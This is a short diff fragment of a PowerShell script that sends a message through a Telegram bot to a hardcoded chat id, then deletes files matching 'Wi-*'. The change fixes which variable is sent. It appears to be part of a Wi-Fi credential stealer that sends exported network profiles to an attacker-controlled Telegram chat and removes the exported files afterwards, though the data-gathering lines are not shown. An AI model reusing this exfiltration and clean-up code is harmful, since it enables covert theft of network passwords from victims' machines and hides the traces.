@@ -13,7 +13,7 @@ $Telegramchatid = "5586673398"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken)/sendMessage?chat_id=$($Telegramchatid)&text=$($Message)"
 }
-Send-Telegram -Message $text
+Send-Telegram -Message $Message
 
 Remove-Item *Wi-*
 
